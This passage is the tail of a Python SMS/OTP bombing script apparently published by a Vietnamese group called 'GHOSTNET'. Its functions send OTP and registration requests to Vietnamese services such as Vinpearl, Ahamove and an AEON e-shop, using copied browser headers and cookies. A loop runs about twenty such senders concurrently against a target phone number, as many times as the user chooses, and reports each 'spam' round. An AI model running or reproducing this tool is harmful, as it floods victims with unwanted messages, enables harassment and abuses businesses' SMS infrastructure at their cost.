datadome=~Z7aIPPlC7sJ2s~w0BCabsOzW8pYVnoPq7AiFtso~ZJmbE9ulZgAfPAhShabOCJBOLCzl1yPVRm99rpP7uP40DfD9~w8ONq2AblGVj7kIODKUTQHPM6ti6Ol~GrZZjql; _ga_DSESGQJZC8=GS1.1.1746105355.1.1.1746105410.5.0.0; _dd_s=rum=0&expire=1746106318905',
}

    json_data = {
    'email': 'erikastephanie468@gmail.com',
    'phone': phone,
    'type': 'userRegistration',
}

    response = requests.post('https://aeoneshop.com/api/issue-otp', cookies=cookies, headers=headers, json=json_data)
def vin(phone):
    headers = {
    'accept': 'application/json',
    'accept-language': 'vi-VN',
    'access-control-allow-headers': 'Accept, X-Requested-With, Content-Type, Authorization, Access-Control-Allow-Headers',
    'authorization': 'Bearer undefined',
    'content-type': 'application/json',
    'origin': 'https://booking.vinpearl.com',
    'priority': 'u=1, i',
    'referer': 'https://booking.vinpearl.com/',
    'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'x-display-currency': 'VND',
}

    json_data = {
    'channel': 'vpt',
    'username': phone,
    'type': 1,
    'OtpChannel': 1,
}

    response = requests.post(
    'https://booking-identity-api.vinpearl.com/api/frontend/externallogin/send-otp',
    headers=headers,
    json=json_data,
)
def aha(phone):
    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/json;charset=UTF-8',
    'origin': 'https://app.ahamove.com',
    'priority': 'u=1, i',
    'referer': 'https://app.ahamove.com/',
    'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
}

    json_data = {
    'mobile': phone,
    'name': 'ghyjfgh',
    'email': 'lasscma@gmail.cim',
    'country_code': 'VN',
    'firebase_sms_auth': 'true',
    'time': 1746106029,
    'checksum': 'GhNcsBdHqx/+p6pLmnRzVBfqpXXPg0QHet4qgQ3w9QEq4cIhqKLBow8Apa12kbfEiAd9q1S5HwIoB7csagrmDe0Wtn7BKvwpys27R7f3dKFv9LjcAghichjjU0bgmZ0lUvzlXwb7XbQUjg7LThRDluDAH20IKVG2B5ZJFwjpx6Pj3L/0tZhEeUxDaiD9W6i0DYOASi2VWKpqB3fZsOFVqFNXcyDDyLwL4Gq2EBM9fd8pYKV08VPEgimotTJf4iLnqGkW85qk3+V+6YKNmQJ9BLYGYbWei57KDCusNTkrU84nHaSlxkFGWpHOTrrjzb77fbyjVCmTjlJEQKOi1Ftpfg==',
}

    response = requests.post('https://api.ahamove.com/api/v3/public/user/register', headers=headers, json=json_data)










functions = [aha, vin, ivivu, sapo, myviettel, medicare, tv360, dienmayxanh, longchau, kingfoodmart, inc, mocha, vieon, hasaki, lotte, tgdd, viettelpost, vuihoc, jlb, eaone]

def banner():
    banner = """
         .-.
       .'   `.          --------------------------------
       :g g   :         | GHOSTNET - VIETNAM - TEAM    |
       : o    `.        |    @CODE BY DUCTUYENDEV      |
      :         ``.     --------------------------------
     :             `.
    :  :         .   `.
    :   :          ` . `.
     `.. :            `. ``;
        `:;             `:' 
           :              `.
            `.              `.     .  
              `'`'`'`---..,___`;.-'
    """ 

    
    print(banner)
    print(" CODE API, TOOL BY: DUCTUYENDEV")
    print(" TELE: @DUCTUYENDEV")
def run(phone, i):
    """ Chạy spam với danh sách functions """
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(fn, phone) for fn in functions]
        for future in concurrent.futures.as_completed(futures):
            try:
                future.result()
            except Exception as exc:
                print(f'⚠️ Lỗi: {exc}')
    print(f" Spam thành công lần {i}")
    for j in range(2, 0, -1):
        print(f"⏳ Chờ {j} giây...", end="\r")
        time.sleep(1)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f" Sai cú pháp! Hãy dùng: python sms.py <sdt> <so_lan_spam>")
        sys.exit(1)
    
    phone = sys.argv[1]
    try:
        count = int(sys.argv[2])
    except ValueError:
        print(" Số lần spam phải là số nguyên!")
        sys.exit(1)
    
    banner()
    for i in range(1, count + 1):
        run(phone, i)
